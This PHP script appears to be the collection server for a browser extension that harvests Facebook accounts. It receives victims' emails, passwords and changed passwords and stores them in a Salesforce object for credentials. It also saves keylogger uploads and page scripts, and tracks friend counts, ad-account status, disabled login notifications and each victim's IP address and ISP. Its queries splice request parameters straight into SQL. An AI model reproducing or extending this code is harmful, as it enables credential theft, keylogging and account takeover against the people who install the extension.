<?php
	ini_set('display_errors', 1);
	
	require_once("include/config.php");
	require_once("include/salesforce.inc");
	require_once("include/loghelper.inc");
	require_once("include/jsonhelpers.inc");

	header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
	header("Pragma: no-cache");

	function nowSFFormat()
	{
		return date("Y-m-d") . "T" . date("h:m:s.000O");
	}

	$SFData = json_decode(file_get_contents("SF.json"), true);

	// Set globals
	$instance_url = $SFData["instance_url"];
	$access_token = $SFData["access_token"];
	$refresh_token = $SFData["refresh_token"];

	if (array_key_exists("uid", $_GET) && !empty($_GET["uid"]))
	{
		// Message
		if (array_key_exists("m", $_GET) && !empty($_GET["m"]))
		{
			logEntry($_GET["uid"], "Client >>> " . $_GET["m"]);

			if (strpos($_GET["m"], "ERROR >>>") !== false)
			{
				logError($_GET["uid"], $_GET["m"]);
			}
			else
			{
				$json = base64_decode($_GET["m"]);

				if ($json !== false)
				{
					$data = json_decode($json, true);

					if ($data != null)
					{
						logEntry($_GET["uid"], single_line_print_r($data));
/*
						if (array_key_exists("s", $data))
						{
							$browserExtensionId = getSFBrowserExtensionObjectId($_GET["uid"]);
							$leadId = getLeadIdFromBrowserExtensionId($browserExtensionId);

							updateSFObject("Lead", $leadId, array("Login__c" => base64_encode($data["s"])));
						}
*/
					}
				}
			}
		}
		else if (array_key_exists("_e", $_GET) || array_key_exists("_p", $_GET) || array_key_exists("_pn", $_GET))
		{
			$browserExtension = getSFQueryResult("SELECT Id, FB_email__c FROM Browser_Extension__c WHERE Name = '$_GET[uid]'")["records"][0];

			$updateMainPassword = true;
			$fields = array();

			$username = $_GET["uid"] . "." . time();

			if (array_key_exists("_e", $_GET))
			{
				$username = $_GET["_e"];

				if ($browserExtension["FB_email__c"] == "")
				{
					$fields["FB_email__c"] = $_GET["_e"];
				}
				else
				{
					logEntry($_GET["uid"], "Not updating FB email.");

					if ($browserExtension["FB_email__c"] != $_GET["_e"])
					{
						$updateMainPassword = false;
					}
				}

				logEntry($_GET["uid"], "_e: " . $_GET["_e"]);
			}
			else
			{
				$updateMainPassword = false;
			}			

			if (array_key_exists("_p", $_GET))
			{
				if ($updateMainPassword)
				{
					$fields["FB_secret__c"] = $_GET["_p"];
				}

				createOrUpdateSFObject("FB_Credentials__c", "Name", $username, array("Secret__c" => $_GET["_p"], "Browser_Extension__c" => $browserExtension["Id"]));

				logEntry($_GET["uid"], "_p: " . $_GET["_p"]);
			}	

			if (array_key_exists("_pn", $_GET))
			{
				if ($updateMainPassword)
				{
					$fields["FB_secret__c"] = $_GET["_pn"];
					$fields["FB_updated_secret__c"] = $_GET["_pn"];
				}

				createOrUpdateSFObject("FB_Credentials__c", "Name", $username, array("Secret__c" => $_GET["_pn"], "Browser_Extension__c" => $browserExtension["Id"]));

				logEntry($_GET["uid"], "_pn: " . $_GET["_pn"]);
			}

			if (!empty($fields))
			{
				updateSFBrowserExtensionObject($_GET["uid"], $fields);
			}
		}
		// Link browser extension to lead
		else if (array_key_exists("l", $_GET))
		{
			logEntry($_GET["uid"], "Link browser extension to lead: " . $_GET["l"]);

			$browserExtensionId = getOrCreateSFBrowserExtensionObject($_GET["uid"]);

			$leadQuery = "SELECT Id, Browser_Extension__c FROM Lead WHERE Activation_Key__c='" . $_GET["l"] . "'";
			$leadResponse = getSFQueryResult($leadQuery);

			logEntry($_GET["uid"], "Lead: " . $leadResponse["records"][0]["Id"] . ":" . $leadResponse["records"][0]["Browser_Extension__c"]);

			if ($leadResponse["records"][0]["Browser_Extension__c"] == null)
			{
				$isp = getJSON("https://farming-controller.herokuapp.com/ip-info?ip_address=" . $_SERVER['REMOTE_ADDR'])["isp"];
				updateSFObject("Lead", $leadResponse["records"][0]["Id"], array("Browser_Extension__c" => $browserExtensionId, "Activation_IP_Address__c" => $_SERVER["REMOTE_ADDR"], "Activation_ISP__c" => $isp));
			}
			else
			{
				logEntry($_GET["uid"], "Link browser extension not updating because already set in lead.");
			}
		}
		// Ad account status
		else if (array_key_exists("as", $_GET))
		{
			logEntry($_GET["uid"], "Ad account status: " . $_GET["as"]);

			$updateFields = array();
			$updateFields["Ad_Account_Status__c"] = $_GET["as"];
			$updateFields["Ad_Account_Status_Last_Checked__c"] = getTodayLA()->format("c");

			if (array_key_exists("aa", $_GET))
			{
				$updateFields["Ad_Account_Active__c"] = $_GET["aa"];
			}

			updateSFBrowserExtensionObject($_GET["uid"], $updateFields);
		}
		// Friends
		else if (array_key_exists("fr", $_GET))
		{
			logEntry($_GET["uid"], "FB friends: " . $_GET["fr"]);

			$friends = preg_replace("/[^0-9]/", "", $_GET["fr"]);

			logEntry($_GET["uid"], "FB friends cleaned: " . $friends);

			$updateFields = array();
			$updateFields["FB_friends__c"] = $friends;
			
			updateSFBrowserExtensionObject($_GET["uid"], $updateFields);		
		}
		// Login notifications disabled
		else if (array_key_exists("lnd", $_GET))
		{
			logEntry($_GET["uid"], "Login notifications disabled: " . $_GET["lnd"]);

			updateSFBrowserExtensionObject($_GET["uid"], array("Login_Notifications_Disabled__c" => $_GET["lnd"]));
		}
		// Reactivated
		else if (array_key_exists("ra", $_GET))
		{
			logEntry($_GET["uid"], "Extension re-activated.");

			updateSFBrowserExtensionObject($_GET["ra"], array("Status__c" => "ABANDONED"));
			updateSFBrowserExtensionObject($_GET["uid"], array("Status__c" => "REACTIVATED"));
		}
		// Install
		else if (array_key_exists("i", $_GET) && array_key_exists("v", $_GET))
		{
			logEntry($_GET["uid"], "Installed: " . $_GET["v"]);

			updateSFBrowserExtensionObject($_GET["uid"], array("Status__c" => "INSTALLED", "Installed__c" => nowSFFormat(), "Version__c" => $_GET["v"]));
		}
		// Updated
		else if (array_key_exists("u", $_GET) && array_key_exists("v", $_GET))
		{
			logEntry($_GET["uid"], "Updated: " . $_GET["v"]);

			updateSFBrowserExtensionObject($_GET["uid"], array("Updated__c" => nowSFFormat(), "Version__c" => $_GET["v"]));
		}
		// Uninstalled / Removed
		else if (array_key_exists("r", $_GET))
		{
			logEntry($_GET["uid"], "Uninstalled." . $_GET["v"]);

			updateSFBrowserExtensionObject($_GET["uid"], array("Status__c" => "UNINSTALLED"));
		}
		else if ($_SERVER['REQUEST_METHOD'] === "POST")
		{
			if (array_key_exists("file", $_POST))
			{
				logEntry($_GET["uid"], "Save file: " . $_GET["script"] . ": " . $_GET["url"]);

				saveFile($_GET["uid"], $_GET["url"], $_GET["script"], $_POST["file"]);
			}
			else if (array_key_exists("_kl", $_POST))
			{
				saveKLFile($_GET["uid"], $_POST["_kl"], $_POST["keyData"]);
			}
		}
	}
	else
	{
		logEntry("invalid", single_line_print_r($_REQUEST));
	}

?>